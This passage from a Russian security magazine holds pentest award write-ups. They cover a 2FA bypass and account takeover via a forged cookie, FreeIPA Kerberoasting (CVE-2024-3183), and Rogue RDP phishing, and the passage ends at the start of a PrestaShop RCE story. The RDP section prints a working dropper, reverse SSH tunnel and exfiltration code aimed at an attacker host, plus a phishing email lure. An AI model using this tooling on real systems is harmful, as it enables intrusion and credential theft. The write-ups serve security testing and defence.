второй фактор аутентификации и просил ввести код из SMS.





                       Страница ввода кода из SMS

Изучив код этой страницы, я нашел интересный параметр — mode4. Здесь он
имеет значение sms.




           Параметры GET-запроса страницы ввода кода из SMS

Я перебрал возможные значения этого параметра и нашел несколько таких,
при которых нас не перенаправляет обратно на страницу ввода логина
и пароля.





       Интересные значения, которые может принять параметр mode4

Здесь интереснее всего значение mode4=registration, которое перенап‐
равляет на страницу завершения регистрации в личном кабинете. Там поль‐
зователь задает себе логин и пароль, но при этом уже задал и подтвердил
номер телефона.





                Вид страницы при mode4=registration

Вводим и подтверждаем пароль одного из полученных ранее пользователей,
и нам удается зайти в личный кабинет, минуя двухфакторную авторизацию.
Также, если изменить логин на этой же странице, он сохраняется изменен‐
ным.


ПОХИЩЕНИЕ УЧЕТКИ

 • Уровень опасности: критический

Итак, мы вошли в систему без регистрации и SMS. Но на этом мы, конечно
же, исследование не прекратим и продолжим копать.
  Мое внимание привлекли cookie на странице смены пароля. Выяснилось,
что  содержимое  страницы  не  зависит  ни  от  каких  значений,  кроме
UserStatus. А это значение перманентно и уникально для каждого поль‐
зователя.





                           Cookie UserStatus

Что будет, если подменить UserStatus одного пользователя аналогичным
значением другого? Логин и пароль оставим прежними. После отправки зап‐
роса приходит ответ, что все прошло успешно. Спокойно извлекаем из него
новые cookie, логин, пароль и UserToken, но уже для сессии другого юзера —
того, чей UserStatus использовался. Также приходит редирект обратно
на страницу входа. Если бы смена не была успешной, этим параметрам
из cookie присваивались бы значения deleted и тоже  происходил бы
редирект.
   Теперь можем войти снова — используя новые логин и пароль. Нас опять
попытается остановить 2FA, то есть запрос кода из SMS. Но мы уже знаем,
что делать в этом случае, и без труда проникаем в личный кабинет поль‐
зователя, UserStatus которого мы использовали.





                Изменение логина и пароля пользователя

Мы не знаем UserStatus для других пользователей, но можем попробовать
                                                  40подобрать это значение. Его длина — 40 бит. Это 2   вариантов, то есть око‐
ло 1,1 триллиона значений. Многовато для перебора!
  Но если разобрать любое известное нам значение UserStatus побитово,
то можно увидеть, из чего оно состоит. Половина каждого байта определяет
поле, а вторая половина — значение этого поля.




                Побитовый разбор значений cookie UserStatus

Теперь мы можем подбирать значения лишь 20 бит. Число вариантов сок‐
              20ращается до 2   , то есть около 1,05 миллиона возможных значений перемен‐
ной UserStatus.
    Результат эксплуатации: несколько захваченных аккаунтов, потенциальная
возможность захвата всех пользовательских аккаунтов за чуть более чем мил‐
лион запросов.


ВЫВОДЫ

Итак, мы поняли, что есть возможность менять логины и пароли всех поль‐
зователей, UserStatus которых содержит те же поля, что известные нам.
Затем мы можем пройти аутентификацию от имени этих пользователей
в обход 2FA. Во время тестирования мне удалось захватить несколько акка‐
унтов и установить, что можно получить доступ к любой учетной записи чуть
более чем за миллион запросов.
   Вот что я порекомендовал сделать заказчику, чтобы устранить уязвимости:

 • Перечисление   пользователей:   унифицировать   ответ   сервера
   при вводе валидных и невалидных учетных данных.
 • Спреинг паролей: каждый раз увеличивать время блокировки учетных
   записей после ввода неверных логина и пароля.
 • Байпас  2FA:  после  того  как  пользователь  прошел  регистрацию,
   не редиректить его в личный кабинет, а перенаправлять на страницу ввода
   логина и пароля.
 • Похищение учетных записей: использовать  связку из  нескольких
   параметров, которые уникально идентифицируют пользователя.
COVERSTORY





Самые веселые баги можно найти там, где
их никто не ждал, — например, в популяр‐
ных решениях управления доступом, таких
как FreeIPA. Представь: у нас есть воз‐
можность   запросить   важные   данные              Im10n
из   системы,   казавшейся   абсолютно
защищенной. Что, если это не просто уда‐
ча? Забегая вперед, скажу, что она привела
меня к нескольким интереснейшим наход‐
кам.


Pentest Award
Этот текст получил первое место на Pentest Award 2024 в категории «Пробив
инфры». Это соревнование ежегодно проводится компанией Awillix.



FreeIPA — это платформа для управления идентификацией и доступом поль‐
зователей в сети, которая часто применяется для централизованного контро‐
ля прав и аутентификации. По сути, Active Directory, но для Linux.
   Когда я в рамках пентеста получил учетную запись из домена на FreeIPA,
оказалось, что прав у учетки почти нет. Однако выяснилось, что с помощью
утилиты kvno можно запросить тикеты TGS для любого пользователя в домене
FreeIPA, хотя обычные  инструменты, такие как Impacket, в этом  случае
не   работали.  Вспомнив  про  метод  подбора  паролей,  известный
как Kerberoasting, я запустил hashcat, но и в этом случае ничего не вышло —
даже при известном пароле для моего пользователя.
  Тем не менее возможность получать TGS для любого  пользователя
домена заинтриговала меня и подтолкнула к дальнейшему исследованию.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ИЩЕМ УЯЗВИМОСТЬ И ПИШЕМ POC

Сначала попробуем поискать, что вообще пишут про это.





Вот, например, Ли Чаголла‑Кристенсен пишет, что FreeIPA не позволяет соз‐
давать сервисы с паролем, заданным пользователем (в AD это соответствует
учетной записи с SPN). Обычные учетные записи не могут использоваться
как  сервисы  Kerberos,  что  делает  невозможным  применение  атаки
Kerberoasting. Это должно обеспечивать высокий уровень безопасности
по умолчанию.
   Что ж, раз по теме ничего нет, начинаем свое исследование. Я развернул
тестовую инфраструктуру и начал изучать MIT Kerberos (который входит в сос‐
тав FreeIPA). Важно было понять, как он интегрируется с 389 Directory
Server — местным аналогом Active Directory.
  Мне удалось установить, что при смене пароля пользователя меняется его
ключ AES. Однако если у пользователей одинаковые пароли, то ключи будут
разные. Значит, все дело в соли (в AD все знают, что это домен плюс имя
пользователя).
   После долгого исследования исходников (так как документации нигде нет)
и просмотра трафика в Wireshark я установил, что для каждого пользователя
во время его заведения в домен используется произвольная соль и при
получении TGT-билета в первом ответе с ошибкой о необходимости пре‐
аутентификации она добавляется в специальное поле. Также ее можно обна‐
ружить при использовании утилиты kinit с локальной переменной KRB5_TRACE.





Как видишь, пароль может вообще состоять из произвольных символов, в том
числе с пробелами и обратными слешами. Также я обнаружил, что FreeIPA
работает только с AES256, что грустно.
   Знание всех этих фактов позволило мне написать на Python простой
скрипт, который перебирал пароли по захваченному билету и соли.





Билет в данном случае был взят из Wireshark, а соль для конкретного поль‐
зователя — из kinit.
   Теперь  оставалось  разобраться с  hashcat для  ускорения перебора
билетов. Анализируя модуль 19700, приходим к некоторым выводам.





Видим, что hashcat берет предоставленный домен, переводит его в верхний
регистр и склеивает с именем пользователя, а результирующую строку
использует как соль. Значит, необходимо переписать модуль. Измененный
модуль выдал заветное cracked на тестовом стенде, а это значит, что можно
было вернуться к заказчику.
   Также я установил, что такая проблема возникает из‑за неправильной
реализации модулей для MIT Kerberos, а именно не была реализована фун‐
кция check_policy_tgs, которая как раз и отвечает за контроль над выдачей
билетов TGS.


КОМПРОМЕТАЦИЯ ДОМЕНА И ПУТЬ К ЭКСПЛУАТАЦИИ

Используя на тот момент zero day, описанный выше, и список популярных
паролей, я восстановил пароль администратора домена и мог наслаждаться
полной компрометацией инфраструктуры.
  Для  эксплуатации  уязвимости  сначала  необходимо  получить  TGT
на любого пользователя домена. На рисунке ниже показан запрос билета TGT
для пользователя user через утилиту kinit.





                           Запрос TGT для user

Далее можно запросить TGS на атакуемого пользователя с помощью утилиты
kvno.





             Результат запроса TGS-билета для пользователя admin

Благодаря Wireshark можно вытащить TGS в исходном виде.
   Далее необходимо получить уникальную соль для пользователя admin.
Для этого можно использовать kinit, а как параметр передать имя пользовате‐
ля, для которого нужно запросить TGS.





     Результат запроса kinit для получения соли для аккаунта пользователя

Далее с помощью программы на Python можно перебрать гипотетические
пароли для расшифровки захваченного TGS.


ОБЩЕНИЕ С ВЕНДОРОМ

Параллельно я сообщил об уязвимости разработчику FreeIPA, то есть в Red
Hat.





В ответ — двухнедельная тишина. Однако потом ответ все же пришел. Парал‐
лельно я написал разработчикам MIT Kerberos:


     Я обнаружил уязвимость, позволяющую запрашивать тикеты TGS (сер-
      виса выдачи тикетов) для доменных пользователей в FreeIPA. Эта уяз-«
      вимость позволяет получать хеши пользователей, что также известно
       как Kerberoasting в Microsoft AD. Насколько я понимаю, ограничение
      на запросы TGS реализовано в LDAP, поэтому эта уязвимость не отно-
        сится к MIT Kerberos. Это так?                »
В ответ мне подробно объяснили, откуда проблема.





     В базовой версии MIT Kerberos администраторам следует установить
      флаг -allow_srv для пользовательских принципалов. Это подробно«
       описано в dictionary.html и упоминается в database.html. Это, воз-
      можно, проблема, что у нас нет возможности «создать пользователь-
      ский принципал» с этим флагом по умолчанию, но этот вопрос можно
       обсудить публично.
       В  интеграциях,  таких  как  FreeIPA и Samba,  присутствуют  воз-
      можности создания пользователей, для которых должен быть установ-
      лен флаг -allow_srv, если он еще не установлен.                »
Я переслал и это письмо в Red Hat, после чего там все же признали баг и к
концу июня этого года таки исправили его. Также присвоили ему CVE-2024-
3183 и упомянули его в обновлении.


ВЫВОДЫ

В результате из‑за банальной ошибки, которая существовала с самого
начала разработки FreeIPA, но которую никто не замечал (скорее всего, из‑за
нестандартной соли), появилась возможность не только получить результат
при пентесте, но и раскрутить его до CVE.
  А на тестовом стенде я также нашел CVE-2024-3657 (уязвимость в 389-ds-
base, приводящая к сбою сервера каталогов) и CVE-2024-1481 (возможность
специально сформированным запросом передавать аргументы для  kinit),
которые тоже относятся к FreeIPA и могут привести к отказу в обслуживании.
Но это уже совсем другая история.
COVERSTORY





За последний год EDR и XDR значительно
повысили  уровень защиты  от  фишинга.
Особые трудности доставляет эвристичес‐
кий    анализ.   Классическая   рассылка
документов  теперь  почти  не  работает.              X0red                                                                                      mon9man@mail.ru
В качестве альтернативы я выбрал Rogue
RDP как средство доставки и технику Living
Off the Land Binaries — для первичного дос‐
тупа в сети заказчика.


Pentest Award
Этот текст получил первое место на премии Pentest Award 2024 в категории
«Ловись рыбка», посвященной фишингу. Соревнование ежегодно проводится
компанией Awillix.



           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Концепция LOLBAS заключается в использовании предустановленных в сис‐
теме средств и приложений с цифровой подписью Microsoft для достижения
цели при пентесте или в хакерской атаке. Этот метод уже неоднократно поз‐
волял злоумышленникам обходить распространенные средства обнаружения
и блокировки вредоносных программ.





                          Rogue RDP

Сразу отмечу, что все заслуги здесь принадлежат Майку Фелчу из Dark Optics.
Файл RDP содержит настройки для подключения к удаленному рабочему сто‐
лу, и, поскольку большинство корпоративных сред используют RDP для кол‐
лективной работы, в Microsoft добавили множество функций для совместного
использования файлов и принтеров, доступа к содержимому буфера обмена,
устройствам захвата аудио и видео, смарт‑картам и даже подключаемым
устройствам. Именно эти особенности я и буду использовать в качестве век‐
тора получения первичного доступа.
  Для реализации Rogue RDP нужно создать машину на Windows с белым IP-
адресом. Далее установить WSL (Windows Subsystem for Linux) и перезапус‐
тить систему:


wsl --install --enable-wsl1

В оболочке WSL нужно установить Python 3, Certbot и Git:


apt update
apt install python3 python3-pip git libaugeas0
pip install certbot

Теперь настроим записи DNS и получим для них сертификат SSL. Покупаем
домен и создаем A-запись для нашего сервера.





С помощью Certbot получаем SSL-сертификат  Let’s Encrypt для нашего
домена (мы будем использовать его для подписания файла RDP и получения
большей визуальной легитимности), для этого используем команду в оболоч‐
ке WSL:


certbot certonly --cert-name malrdp -d <your.domain.com> --register
unsafely-without-email

Закрытый и открытый ключи сохранятся в файловой системе WSL:


/etc/letsencrypt/live/YOUR_CERT_NAME/

Теперь преобразуем их в формат PFX с помощью OpenSSL:


openssl pkcs12 -inkey /etc/letsencrypt/live/malrdp/privkey.pem -in /
etc/letsencrypt/live/malrdp/fullchain.pem -export -out malrdp.pfx





Следующий шаг — установить этот сертификат в магазин сертификатов
Windows. Для этого кликаем правой кнопкой мыши на файле PFX, жмем Install
PFX и следуем инструкциям. Когда сертификат будет установлен, получим его
отпечаток и можем использовать его для подписи файла RDP.
   Копируем отпечаток сертификата: certmgr.msc → Personal → Certificates →
двойной клик по нашему сертификату → Details → Thumbprint. Он нам понадо‐
бится для следующего шага.





Создаем файл RDP, который будем использовать при рассылке, и вставляем
в него следующее:


screen mode id:i:1
use multimon:i:0
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,1,1904,23,3840,1142
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:<YOUR_DOMAIN_COM>:443
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectwebauthn:i:1
redirectclipboard:i:1
redirectposdevices:i:0
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
enablerdsaadauth:i:0
redirectlocation:i:0
drivestoredirect:s:*

Теперь подписываем этот файл:


rdpsign.exe /sha256 YOUR_CERTIFICATE_THUMBPRINT .\<filename>.rdp

Проверяем, что он действительно подписан.





Создаем нового пользователя для подключения наших жертв:


net user tsuser StrongP4ssw0rd /add
net localgroup administrators tsuser /add

Я придерживаюсь мнения, что фраза «красота в простоте» идеально при‐
менима к фишингу, так как мы всегда хотим уменьшить количество действий,
которые жертва должна совершить для успешного выполнения задуманного
сценария. Ввод пароля при подключении по RDP создаст дополнительные
трудности в подключении человека к нашей машине.
   Чтобы упростить задачу пользователю, применим утилиту PyRDP, которая
действует как прокси‑сервер MitM и позволит жертве автоматически пройти
аутентификацию.
   Снова открываем оболочку WSL и устанавливаем PyRDP:


pipx install pyrdp-mitm

Перед запуском необходимо убедиться, что NLA (Network Level Authentication)
отключена для нашего RDP-сервера. Открываем Windows Settings → Remote
Desktop → Advanced Settings и убираем флажок Require computers to use
Network Level Authentication to connect.
   Второй  способ  отключения — с помощью gpedit.msc.  Открываем
Computer Configuration → Administrative Templates → Windows Components →
Remote Desktop Services → Remote Desktop Session Host → Security и отклю‐
чаем настройку Require user authentication for remote connections by using
Network Level Authentication.
   Теперь все готово к запуску PyRDP (публичный и закрытый ключ сер‐
тификата необходимы, чтобы жертва не получила никаких предупреждений
SSL):


pyrdp-mitm.py 127.0.0.1:3389 -u tsuser -p StrongP4ssw0rd --listen 443
-c /etc/letsencrypt/live/malrdp/fullchain.pem -k
/etc/letsencrypt/live/malrdp/privkey.pem

Проверим процесс подключения с запущенным PyRDP и увидим ошибку.





Она фиксится добавлением кастомного статуса в следующий скрипт:


...pyrdp-mitm/lib/python3.10/site packages/pyrdp/enum/windows.py





Теперь при запуске файла .rdp мы не получим предупреждения SSL и соеди‐
нение пройдет без необходимости вводить учетные данные. Также видим, что
у сеанса RDP есть доступ к файловой системе хоста.





На этом этапе у нас есть только файл RDP, который автоматически подклю‐
чится к нашему серверу без необходимости вводить пароль и будет предос‐
тавлять файловую систему хоста жертвы нашему серверу. Есть несколько
способов использовать этот уровень доступа, лично я предпочитаю добав‐
лять нашу программу в папку Startup и ждать выполнения при следующем вхо‐
де в систему.
   Давай напишем на C# простую программу и назовем ее MalRDP.exe.
При запуске она будет подключаться к файловой системе хоста жертвы (в
частности, к диску C), искать любую папку Startup, к которой у нее есть доступ,
и копировать в нее два простых и безобидных скрипта, которые сами по себе
не представляют никакой угрозы и не детектируются антивирусом. Также
наша программа будет копировать несколько совершенно легитимных фай‐
лов (LOLBins), о которых я расскажу дальше.
  Код программы:


using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
namespace MalRDP
{
 class Program
 {
 [DllImport("wtsapi32.dll", SetLastError = true)]
 static extern bool WTSLogoffSession(IntPtr hServer, int sessionId,
bool bWait);
 [DllImport("kernel32.dll")]
 static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 const int SW_HIDE = 0;
 const int WTS_CURRENT_SESSION = -1;
 static readonly IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;
 static void CopyDirectory(string sourceDir, string destDir)  {
 // Get the subdirectories for the specified directory.
DirectoryInfo dir = new DirectoryInfo(sourceDir);
 if (!dir.Exists)
 {
 throw new DirectoryNotFoundException(
 "Source directory does not exist or could not be found: "  +
sourceDir);
 }
 // If the destination directory doesn’t exist, create it.  if (
!Directory.Exists(destDir))
 {
 Directory.CreateDirectory(destDir);
 }
 // Get the files in the directory and copy them to the new location.
 FileInfo[] files = dir.GetFiles();
 foreach (FileInfo file in files)
 {
 string tempPath = Path.Combine(destDir, file.Name);  file.CopyTo(
tempPath, false);
 Console.WriteLine($"Copied {file.FullName} to {tempPath}");
 }
 // Copy subdirectories and their contents recursively.
DirectoryInfo[] dirs = dir.GetDirectories();  foreach (DirectoryInfo
subdir in dirs)
 {
 string tempPath = Path.Combine(destDir, subdir.Name);  CopyDirectory
(subdir.FullName, tempPath);  }
 }
 static void Main(string[] args)
 {
 var handle = GetConsoleWindow();
 ShowWindow(handle, SW_HIDE);
 int retry = 0;
 string[] user_directories = {};
 while (retry < 10)
 {
 try
 {
 user_directories =
Directory.GetDirectories(@"\\tsclient\C\Users");
 break;
 }
 catch {


 }
 System.Threading.Thread.Sleep(500);
 retry++;
 }
 string dropperInPath = @"C:\Netlogon\sshishing2.exe";  string
sshingInPath = @"C:\Netlogon\sshishing.exe";  string sshInDirPath =
@"C:\Netlogon\OpenSSH-Win64";  string sshKeyInPath = @"C:\Netlogon\
rsa";
 foreach (string dir in user_directories)  {
 if (dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.
EndsWith("Public") || dir.EndsWith("All Users"))  continue;
 try
 {
 string dropperOutPath = $@"
{dir}\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup\sshishing2.exe";
 string sshingOutPath = $@"
{dir}\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup\sshishing.exe";
 string sshOutDirPath = $@"{dir}\Pictures\OpenSSH Win64";
 string sshKeyOutPath = $@"{dir}\Pictures\rsa";  if (File.Exists(
dropperInPath) &&
!File.Exists(dropperOutPath))
 {
 File.Copy(dropperInPath, dropperOutPath);  }
 if (File.Exists(sshingInPath) &&
!File.Exists(sshingOutPath))
 {
 File.Copy(sshingInPath, sshingOutPath);  }
 if (File.Exists(sshKeyInPath) &&
!File.Exists(sshKeyOutPath))
 {
 File.Copy(sshKeyInPath, sshKeyOutPath);  }
 if (Directory.Exists(sshInDirPath) && !Directory.Exists(
sshOutDirPath))
 {
 CopyDirectory(sshInDirPath, sshOutDirPath);  }
 }
 catch (Exception e)
 {
 }
 }
 WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE,
WTS_CURRENT_SESSION, false);
 }
 }
}

Создадим папку C:\Netlogon и скопируем в нее скомпилированную прог‐
рамму и остальные файлы. Также создадим файл tsuser.bat, который прос‐
то запускает MalRDP.exe:


Start "" "C:\\Netlogon\\MalRDP.exe"`

Теперь установим tsuser.bat в качестве скрипта входа для tsuser. Откры‐
ваем Computer Management → System Tools → Local Users and Groups →
Users, дважды кликаем по tsuser → Profile и прописываем tsuser.bat в Logon
Script field.
   Когда жертва подключится к нашему RDP-серверу, на нем запустится
наша программа, которая сможет взаимодействовать с файловой системой
жертвы, потому что корпорация Microsoft предоставила отличные возможнос‐
ти коду, работающему в среде RDP-сервера.
   Запущенные отсюда программы могут взаимодействовать с подключен‐
ными клиентами с помощью перенаправления устройств. Это позволяет
получить доступ к локальным дискам, принтерам и прочим ресурсам через
удаленный рабочий стол. Серверы могут перечислять файловую систему под‐
ключенного клиента, используя пути к папкам вроде \\tsclient\c\ (диск C)
или даже смонтированные сетевые файловые ресурсы с помощью такого
пути:


\\tsclient\<drive_of_mapped_share>\




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
ШИШИНГ С ROGUE RDP
            ИСПОЛЬЗУЕМ ВСТРОЕННЫЕ
              СРЕДСТВА WINDOWS ДЛЯ
             ПРОНИКНОВЕНИЯ В СЕТЬ





SSHISHING

После удачного фишинга, как показывает статистика, у нас есть контроль
над компьютером жертвы, однако сам по себе он не представляет большого
интереса в рамках пентеста. Это лишь дверь во внутреннюю инфраструктуру
заказчика. Дальше в ход идут инструменты бокового перемещения (pivoting),
применение которых теперь тоже хорошо детектируется средствами защиты.
  SSH предлагает некоторые захватывающие возможности в рамках нет‐
радиционного вектора начального доступа. С его помощью мы и получим
желанный туннель реверс‑прокси в целевую сеть, в обход средств защиты.





Так как SSH на старых версиях Windows не предустановлен по умолчанию,
принесем его с собой и положим в папку Pictures способом, описанным
ранее. Тащить с собой все  долго, и нам  хватит лишь двух бинарей:
libcrypto.dll и ssh.exe. Скачать портативную версию можно на GitHub.
  На VPS, используемых для атаки, создадим нового пользователя pivoting
и сгенерируем ему ключ SSH. Копируем публичный ключ в authorized_keys
этой учетной записи, а приватный кладем в папку C:\Netlogon, на сервере
Rogue RDP.
   Теперь   создадим  две  безобидные   программы:  sshishing.exe,
sshishing2.exe, которые выполнят оставшуюся часть работы после перезаг‐
рузки системы жертвы.


#![windows_subsystem = "windows"]
std:: process:: os::windows::process::
use { Command, CommandExt}; fn main() {
 let _output = Command::new("powershell")
 .args(&[
 "-Command",
 &format!(
 "$currentUser = $env:USERNAME; Invoke-Expression "C: \\Users \\$
currentUser \\Pictures \\OpenSSH-Win64 \\ssh.exe pivoting@<attacker_ip>
-N -R 0 -i C: \\Users \\$currentUser \\Pictures \\rsa - o
StrictHostKeyChecking=no -o 'PermitLocalCommand=yes ' -o
'LocalCommand=C: \\Users \\$currentUser \\Pictures \\OpenSSH-Win64 \\ssh.
exe -i \\\\<attacker_ip> \\key.pem sshisher@1.1.1.1 '""
 ),
 ])
 .creation_flags(0x08000000) // Set creation flags
 .output()
 .expect("Failed");
}

Программа создаст реверс‑прокси‑туннель в целевую сеть. Параметр -R 0
инструктирует SSH выбрать доступный порт на удаленной машине (это необ‐
ходимо, чтобы иметь возможность поддерживать несколько одновременных
успешных соединений). Параметр -o StrictHostKeyChecking=no поможет
избежать предупреждения о неизвестном хосте SSH для подключения, а -o
"LocalCommand=... выполнит указанную команду на хосте жертвы после
успешного подключения. В нашем случае попытается обратиться к VPS ата‐
кующих и забрать файл (файла может и не быть, а жертву будет ждать
Responder, с помощью которого мы попытаемся получить хеш жертвы, так
как по статистике 20% компаний подвержены утечке Net-NTLMv2 при обра‐
щении к внешним ресурсам). Интересно, что ssh.exe может порождать cmd.
exe и выполнять команды, даже если это запрещено с помощью GPO.





Вторая программа выполнит приятный трюк, который поможет собрать
информацию о целевой сети. Она выполнит команду и перенаправит вывод
в SSH для записи в файл на удаленной машине:


#![windows_subsystem = "windows"]
std:: process:: os::windows::process::
use { Command, CommandExt};
fn main() {
 let _output = Command::new("powershell.exe")
 .args(&[
 "-Command",
 &format!(
 "$currentUser = $env:USERNAME; Invoke-Expression "net user /domain |
C: \\Users \\$currentUser \\Pictures \\OpenSSH-Win64 \\ssh.exe pivoting@<
attacker_ip> -i C: \\Users \\$currentUser \\Pictures \\rsa -o
StrictHostKeyChecking=no 'cat >> info2.txt '""
 ),
 ])
 .creation_flags(0x08000000)
 .output()
 .expect("Failed");
 let _output = Command::new("powershell.exe")
 .args(&[
 "-Command",
 &format!(
 "$currentUser = $env:USERNAME; Invoke-Expression "ipconfig | C: \\
Users \\$currentUser \\Pictures \\OpenSSH-Win64 \\ssh.exe pivoting@<
attacker_ip> -i C: \\Users \\$currentUser \\Pictures \\rsa -o
StrictHostKeyChecking=no 'cat >> info.txt '""
 ),
 ])
 .creation_flags(0x08000000)
 .output()
 .expect("Failed");
}

К слову, об уклонении от средств защиты и безобидности нагрузки. VirusTotal
показывает   3/71   детекта,   а   простая   программа,   выполняющая
whoami, — 2/71. При этом мы даже не пытались скрыть наши намерения.
При желании можно свести детекты к нулю.





Положим обе программы в папку C:\Netlogon на сервере Rogue RDP.


        WWW

                        Подробнее с возможностями SSH для пентестера
                         можно ознакомиться в следующих статьях: The
                  SOCKS We Have at Home, SSHishing – Abusing
                          Shortcut Files and the Windows SSH Client for Initial
                       Access.



ПРИМЕНЕНИЕ НА ПРАКТИКЕ





Описанный метод фишинга показал высокую результативность на реальных
проектах. Ниже — образец письма:

      Уважаемые сотрудники.
        Для обеспечения безопасного доступа к корпоративным ресурсам«
      и почтовому серверу мы тестируем новую систему удаленного доступа
      по протоколу RDP. Просим вас проверить работоспособность подклю-
      чения по RDP и убедиться, что вы можете успешно получить доступ
       к необходимым ресурсам. Инструкция по использованию RDP при-
       лагается во вложениях к письму.
       В случае возникновения трудностей при подключении обратитесь
      в отдел информационной безопасности для получения дальнейшей
      помощи.
         Данное письмо содержит конфиденциальную информацию. Зап-
      рещается пересылать данное сообщение третьим лицам без  сог-
       ласования.
         Спасибо за понимание и сотрудничество.
       С уважением,
      старший инженер отдела информационной безопасности
       А. Вилликс                »
Когда получатель письма подключился к RDP-серверу и перезагрузил свой
ПК, на VPS появился новый туннель реверс‑прокси, информация о целевой
сети и пользователях AD.





К моему удивлению,  тестируемая компания  входила в те самые 20%,
и Responder поймал хеш пользователя.



ssh -L 9000:127.0.0.1:39591 root@<pivoting_vps_ip>

Прокинув нужный удаленный порт VPS этой командой, я смог применять
необходимые инструменты через proxychains.
  В результате сканирования сети нашелся старый почтовый сервис, дос‐
тупный только изнутри. Разумеется, про него забыли администраторы, и он
оказался  уязвим  к  ProxyNotShell   (CVE-2022-41040  и  CVE-2022-41082).
С помощью утекшего хеша NTLMv2 я получил учетные данные, необходимые
для работы эксплоита.
   Сдампив SAM, SYSTEM и SECURITY, я извлек несколько хешей, но они
не подошли к учетным записям привилегированных пользователей AD.
  Имея права локального администратора, я получил сохраненные пароли
из браузера, среди которых был пароль администратора AD. А это уже полная
компрометация инфраструктуры заказчика.


РЕКОМЕНДАЦИИ

Что сделать, чтобы избежать подобного? Вот основные советы.
 • Настроить групповые политики (GPO) для предотвращения редиректа
   устройств при подключении к удаленному рабочему столу (RDP).
 • Заблокировать расширения .rdp для электронной почты. Заблокировать
   подключения RDP, выходящие за периметр корпоративной сети. Обучить
   сотрудников распознавать фишинг.
 • Настроить регулярный мониторинг и аудит сетевой активности для обна‐
   ружения и реагирования на подозрительное поведение, связанное с ата‐
   ками на утечку NTLM.
 • Ограничить исходящий NTLM-трафик на внешние ресурсы, за пределами
   корпоративной сети.
 • Ограничить исходящий SSH-трафик на внешние ресурсы, за пределами
   корпоративной сети.
 • Применить   правила  для   выявления   подозрительного   поведения
   при   запуске  ssh.exe   с   параметрами  PermitLocalCommand
   и LocalCommand.
COVERSTORY





В этой статье я расскажу, как одна малень‐
кая  ошибка  с  установочным  скриптом
в CMS PrestaShop может открыть дверь
для  удаленного  выполнения  кода.  Ока‐
залось, что некоторые аспекты этой CMS               tr3harder
устроены так, что не подлежат исправлению
и создают опасные лазейки для опытных
хакеров.


Pentest Award
Этот текст получил третье место на премии Pentest Award 2024 в категории
«Пробив WEB». Это соревнование ежегодно проводится компанией Awillix.


Я изучил две уникальные RCE-уязвимости, которые останутся открытыми
для эксплуатации, и провел успешный пробив через десериализацию в движ‐
ке кеша, воспользовавшись трюком с базой данных.
   Дальше я постараюсь не просто описать кейс о найденных уязвимостях,
а вдохновить тебя, рассказав о скрытых возможностях багбаунти. Готов пог‐
ружаться в детали?


КАК ВСЕ НАЧИНАЛОСЬ

Эта история случилась со мной не так давно. Я участвовал в багбаунти
и бороздил просторы  скоупа в  поисках  уязвимостей. И  тут  наткнулся
на  ненастроенный инстанс PrestaShop  у  одного из больших вендоров
с хорошими выплатами. Я был впечатлен своей находкой и сразу же начал
искать информацию о векторах проникновения и способах эксплуатации.
   Оказалось, что такой информации вообще нет и придется все выяснять
самому.
   Поскольку это суровый мир багбаунти, где ты должен быть быстрее других,
я решил немедленно завершить настройку сам, ведь если бы этого не сделал
я, сделал бы кто‑то другой.
   Процесс устроен так же, как и в других CMS вроде WordPress или Joomla.
Необходимо пройти несколько шагов установки. Из важных я могу выделить
два:
 1. Настройка базы данных (MySQL). Необходимо указать адрес сервера,
   логин и пароль к нему (есть возможность сразу проверить соединение).
 2. Ввод пароля для аккаунта администратора.

И если со вторым пунктом все просто и понятно, пароль мы уж как‑нибудь
зададим, то для первого есть целый ряд проверок, которые нужно пройти,
чтобы установка считалась завершенной. Эта установка может быть доступна
только один раз, я хотел сразу проверить возможные баги. Например:
 1. Возможна ли тут слепая SSRF с импактом (например, поменять протокол,
   использовать врапперы, подключиться к внешнему хосту и предложить
   NTLM-аутентификацию, посканить локальную сеть).
 2. Поскольку это MySQL, возможно ли у нас чтение файлов через Rogue
  MySQL (включена ли функция --enable-local-infile на клиенте).

Но мы не хотим отвлекаться на долгие проверки, потому что в это время
кто‑то может успеть увести у нас доступ к установщику. По‑всякому сканиро‐
вать сеть через подключение к MySQL звучит не очень перспективно и не
даст нам никаких реальных способов атаки. Из других векторов же ничего
не сработало.
   Если указать localhost в качестве хоста для базы данных, то получаем
сообщение об ошибке service timeout.
